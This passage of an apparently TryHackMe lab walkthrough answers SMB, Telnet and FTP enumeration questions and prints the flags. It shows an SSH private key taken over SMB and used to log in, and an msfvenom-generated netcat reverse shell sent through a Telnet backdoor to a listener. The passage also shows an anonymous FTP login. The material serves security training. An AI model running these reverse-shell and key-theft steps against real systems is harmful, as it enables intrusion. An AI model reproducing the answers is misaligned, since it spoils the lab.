+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>getting file <span style="color:#89b4fa">\.</span>ssh<span style="color:#89b4fa">\i</span>d_rsa of size <span style="color:#fab387">1679</span> as id_rsa <span style="color:#89dceb;font-weight:bold">(</span>819.8 KiloBytes/sec<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">(</span>average 819.8 KiloBytes/sec<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>smb: <span style="color:#89b4fa">\.</span>ssh<span style="color:#89b4fa">\&gt;</span> <span style="color:#89dceb">exit</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>root@ip-10-10-51-158:~# chmod <span style="color:#fab387">600</span> id_rsa</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-51-158:~# ssh root@10.10.190.95 -i id_rsa
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>root@10.10.190.95<span style="color:#f38ba8">&#39;</span>s password:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>root@ip-10-10-51-158:~# ssh johncactus@10.10.190.95 -i id_rsa
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Connection closed by 10.10.190.95 port <span style="color:#fab387">22</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>root@ip-10-10-51-158:~# ssh JohnCactus@10.10.190.95 -i id_rsa
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Connection closed by 10.10.190.95 port <span style="color:#fab387">22</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>root@ip-10-10-51-158:~# ssh cactus@10.10.190.95 -i id_rsa
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 4.15.0-96-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>  System information as of Mon Jun <span style="color:#fab387">24</span> 05:55:20 UTC <span style="color:#fab387">2024</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>  System load:  0.0                Processes:           <span style="color:#fab387">93</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>  Usage of /:   33.3% of 11.75GB   Users logged in:     <span style="color:#fab387">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>  Memory usage: 17%                IP address <span style="color:#cba6f7">for</span> eth0: 10.10.190.95
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>  Swap usage:   0%
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span><span style="color:#fab387">22</span> packages can be updated.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span><span style="color:#fab387">0</span> updates are security updates.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>Last login: Tue Apr <span style="color:#fab387">21</span> 11:19:15 <span style="color:#fab387">2020</span> from 192.168.1.110
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>cactus@polosmb:~$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>smb.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>cactus@polosmb:~$ cat smb.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>smb_is_fun_eh?<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
+<br>
+<h3 id="telnet">Telnet</h3>
+<hr>
+<h4 id="understanding-telnet">Understanding Telnet</h4>
+<p>What is Telnet?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Application Protocol</code></pre>
+<br>
+<p>What has slowly replaced Telnet?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>SSH</code></pre>
+<br>
+<p>How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>telnet 10.10.10.3 23</code></pre>
+<br>
+<p>The lack of what, means that all Telnet communication is in plain text?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Encryption</code></pre>
+<br>
+<h4 id="enumerating-telnet">Enumerating Telnet</h4>
+<p>How many ports are open on the target machine?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>1</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>PORT     STATE SERVICE REASON         VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>8012/tcp open  unknown syn-ack ttl <span style="color:#fab387">64</span></span></span></code></pre></div>
+<br>
+<p>What port is this?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>8012</code></pre>
+<br>
+<p>This port is unassigned, but still lists the protocol it&rsquo;s using, what protocol is this?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>TCP</code></pre>
+<br>
+<p>Now re-run the nmap scan, without the -p- tag, how many ports show up as open?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>0</code></pre>
+<br>
+<p>Based on the title returned to us, what do we think this port could be used for?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>a backdoor</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>8012/tcp open  unknown
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>|   DNSStatusRequest, DNSVersionBindReq, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>|_    SKIDY<span style="color:#f38ba8">&#39;</span>S BACKDOOR. Type .HELP to view commands</span></span></code></pre></div>
+<br>
+<p>Who could it belong to? Gathering possible <strong>usernames</strong> is an important step in enumeration.</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Skidy</code></pre>
+<br>
+<h4 id="exploring-telnet">Exploring Telnet</h4>
+<p>Great! It&rsquo;s an open telnet connection! What welcome message do we receive?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>SKIDY&#39;S BACKDOOR</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# telnet 10.10.220.9 <span style="color:#fab387">8012</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Trying 10.10.220.9...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Connected to 10.10.220.9.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>Escape character is <span style="color:#a6e3a1">&#39;^]&#39;</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>SKIDY<span style="color:#f38ba8">&#39;</span>S BACKDOOR. Type .HELP to view commands</span></span></code></pre></div>
+<br>
+<p>Let&rsquo;s try executing some commands, do we get a return on any input we enter into that telnet session? (Y/N)</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>N</code></pre>
+<br>
+<p>Hmm&hellip; that&rsquo;s strange. Let&rsquo;s check to see if what we&rsquo;re typing is being executed as a system command.</p>
+<p>Start a tcpdump listener on your local machine.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# sudo tcpdump ip proto<span style="color:#89b4fa">\\</span>icmp -i ens5
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>tcpdump: verbose output suppressed, use -v or -vv <span style="color:#cba6f7">for</span> full protocol decode
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>listening on ens5, link-type EN10MB <span style="color:#89dceb;font-weight:bold">(</span>Ethernet<span style="color:#89dceb;font-weight:bold">)</span>, capture size <span style="color:#fab387">262144</span> bytes</span></span></code></pre></div>
+<br>
+<p>Now, use the command <strong>Ping [local THM ip] -c 1</strong> through the telnet session to see if we&rsquo;re able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Y</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# telnet 10.10.220.9 <span style="color:#fab387">8012</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Trying 10.10.220.9...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Connected to 10.10.220.9.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>Escape character is <span style="color:#a6e3a1">&#39;^]&#39;</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>SKIDY<span style="color:#f38ba8">&#39;</span>S BACKDOOR. Type .HELP to view commands
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>.RUN ping 10.10.46.62 -c <span style="color:#fab387">1</span></span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# sudo tcpdump ip proto<span style="color:#89b4fa">\\</span>icmp -i ens5
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>tcpdump: verbose output suppressed, use -v or -vv <span style="color:#cba6f7">for</span> full protocol decode
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>listening on ens5, link-type EN10MB <span style="color:#89dceb;font-weight:bold">(</span>Ethernet<span style="color:#89dceb;font-weight:bold">)</span>, capture size <span style="color:#fab387">262144</span> bytes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>03:35:25.225403 IP ec2-13-214-173-166.ap-southeast-1.compute.amazonaws.com &gt; ip-10-10-46-62.eu-west-1.compute.internal: ICMP <span style="color:#89dceb">echo</span> reply, id 16509, seq 14618, length <span style="color:#fab387">8</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>03:36:25.256032 IP ip-10-10-220-9.eu-west-1.compute.internal &gt; ip-10-10-46-62.eu-west-1.compute.internal: ICMP <span style="color:#89dceb">echo</span> request, id 1319, seq 1, length <span style="color:#fab387">64</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>03:36:25.256083 IP ip-10-10-46-62.eu-west-1.compute.internal &gt; ip-10-10-220-9.eu-west-1.compute.internal: ICMP <span style="color:#89dceb">echo</span> reply, id 1319, seq 1, length <span style="color:#fab387">64</span></span></span></code></pre></div>
+<br>
+<p>We&rsquo;re going to generate a reverse shell payload using msfvenom. This will generate and encode a netcat reverse shell for us. here&rsquo;s our syntax:
+<strong>msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R</strong></p>
+<ul>
+<li><strong>-p</strong> = payload</li>
+<li><strong>host</strong> = our local host IP address (this is your machine&rsquo;s IP address)</li>
+<li><strong>lport</strong> = the port to listen on (this is the port on your machine)</li>
+<li><strong>R</strong> = export the payload in raw format</li>
+</ul>
+<br>
+<p>What word does the generated payload start with?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>mkfifo</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# msfvenom -p cmd/unix/reverse_netcat <span style="color:#f5e0dc">lhost</span><span style="color:#89dceb;font-weight:bold">=</span>10.10.46.62 <span style="color:#f5e0dc">lport</span><span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">4444</span> R
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#89dceb;font-weight:bold">[</span>-<span style="color:#89dceb;font-weight:bold">]</span> No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span><span style="color:#89dceb;font-weight:bold">[</span>-<span style="color:#89dceb;font-weight:bold">]</span> No arch selected, selecting arch: cmd from the payload
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>Payload size: <span style="color:#fab387">101</span> bytes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>mkfifo /tmp/loqsthl; nc 10.10.46.62 <span style="color:#fab387">4444</span> 0&lt;/tmp/loqsthl | /bin/sh &gt;/tmp/loqsthl 2&gt;&amp;1; rm /tmp/loqsthl</span></span></code></pre></div>
+<br>
+<p>Now all we need to do is start a netcat listener on our local machine. We do this using:
+<strong>nc -lvp [listening port]</strong></p>
+<p>What would the command look like for the listening port we selected in our payload?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>nc -lvp 4444</code></pre>
+<br>
+<p>Success!! What is the contents of flag.txt?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{y0u_g0t_th3_t3ln3t_fl4g}</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# telnet 10.10.220.9 <span style="color:#fab387">8012</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Trying 10.10.220.9...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Connected to 10.10.220.9.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>Escape character is <span style="color:#a6e3a1">&#39;^]&#39;</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>SKIDY<span style="color:#f38ba8">&#39;</span>S BACKDOOR. Type .HELP to view commands
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>.RUN mkfifo /tmp/loqsthl; nc 10.10.46.62 <span style="color:#fab387">4444</span> 0&lt;/tmp/loqsthl | /bin/sh &gt;/tmp/loqsthl 2&gt;&amp;1; rm /tmp/loqsthl</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-46-62:~# nc -lvp <span style="color:#fab387">4444</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Listening on <span style="color:#89dceb;font-weight:bold">[</span>0.0.0.0<span style="color:#89dceb;font-weight:bold">]</span> <span style="color:#89dceb;font-weight:bold">(</span>family 0, port 4444<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Connection from ip-10-10-220-9.eu-west-1.compute.internal <span style="color:#fab387">57836</span> received!
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>cat flag.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>y0u_g0t_th3_t3ln3t_fl4g<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
+<br>
+<h3 id="ftp-file-transfer-protocol">FTP (File Transfer Protocol)</h3>
+<hr>
+<h4 id="understanding-ftp">Understanding FTP</h4>
+<p>What communications model does FTP use?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>client-server</code></pre>
+<br>
+<p>What&rsquo;s the standard FTP port?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>21</code></pre>
+<br>
+<p>How many modes of FTP connection are there?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>2</code></pre>
+<p>The FTP server may support either Active or Passive connections, or both.</p>
+<ul>
+<li>In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it.</li>
+<li>In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.</li>
+</ul>
+<br>
+<h4 id="enumerating-ftp">Enumerating FTP</h4>
+<p>Run an nmap scan of your choice.</p>
+<p>How many ports are open on the target machine?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>2</code></pre>
+<br>
+<p>What port is ftp running on?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>21</code></pre>
+<br>
+<p>What variant of FTP is running on it?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>vsftpd</code></pre>
+<br>
+<p>Great, now we know what type of FTP server we&rsquo;re dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing <strong>FTP [IP]</strong> into the console, and entering &ldquo;anonymous&rdquo;, and no password when prompted.</p>
+<p>What is the name of the file in the anonymous FTP directory?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>PUBLIC_NOTICE.txt</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-87-146:~# ftp 10.10.41.45
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Connected to 10.10.41.45.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#fab387">220</span> Welcome to the administrator FTP service.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Name <span style="color:#89dceb;font-weight:bold">(</span>10.10.41.45:root<span style="color:#89dceb;font-weight:bold">)</span>: anonymous
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#fab387">331</span> Please specify the password.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Password:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#fab387">230</span> Login successful.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Remote system <span style="color:#89dceb">type</span> is UNIX.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Using binary mode to transfer files.
